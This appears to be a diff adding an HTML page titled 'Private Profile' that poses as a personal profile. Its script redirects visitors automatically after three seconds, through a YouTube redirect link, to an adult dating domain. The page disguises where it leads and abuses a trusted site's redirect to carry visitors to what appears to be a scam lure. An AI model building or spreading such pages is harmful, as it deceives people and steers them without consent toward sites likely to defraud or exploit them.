@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="css/style2.css">
+<script src="script.js"></script>
+<link rel="icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" href="/logo192.png" />
+<title>Private Profile</title>
+
+</head>
+
+<body>
+  <img src="img/300.jpg" alt="Profile Picture">
+  <button onclick="myFunction()">View my profile</button>
+<script>
+  setTimeout(function() {
+    myFunction();
+  }, 3000);
+
+  function myFunction() {
+    var appLink = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbUNvZVVSSW9CUU5saGxHMG53TkN4ak9USkprUXxBQ3Jtc0tuSDZXekUwcHhtOFNxNkNhTDliMEVHQS1vUWpTa1V4NDRoaV9rTDU1X1E1cnNidkt0d1JPQ242eTNRdnJwV0lRYmdKZVdqekt4WmVQTFVyVmY3U0xjLUJJcWJUVVJsajhKZHZiZnBUQkYzMUpTZFR0Yw&q=https%3A%2F%2Fbhhaceb.adultsinder.online%2Fs%2F641346d72966f&html_redirect=1";
+    var fallbackLink = "https://www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbUNvZVVSSW9CUU5saGxHMG53TkN4ak9USkprUXxBQ3Jtc0tuSDZXekUwcHhtOFNxNkNhTDliMEVHQS1vUWpTa1V4NDRoaV9rTDU1X1E1cnNidkt0d1JPQ242eTNRdnJwV0lRYmdKZVdqekt4WmVQTFVyVmY3U0xjLUJJcWJUVVJsajhKZHZiZnBUQkYzMUpTZFR0Yw&q=https%3A%2F%2Fbhhaceb.adultsinder.online%2Fs%2F641346d72966f&html_redirect=1";
+
+    var isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    var isAppInstalled = false;
+
+    if (isMobile) {
+      if (window.location.href.indexOf("app_installed=true") !== -1) {
+        isAppInstalled = true;
+      }
+    }
+
+    if (isMobile && isAppInstalled) {
+      window.location.href = appLink;
+    } else {
+      window.location.href = fallbackLink;
+    }
+	
+    function killPopup() {
+      window.removeEventListener('pagehide', killPopup);
+    }
+
+    window.addEventListener('pagehide', killPopup);
+  }
+</script>
+
+
+
+</body>
+</html>
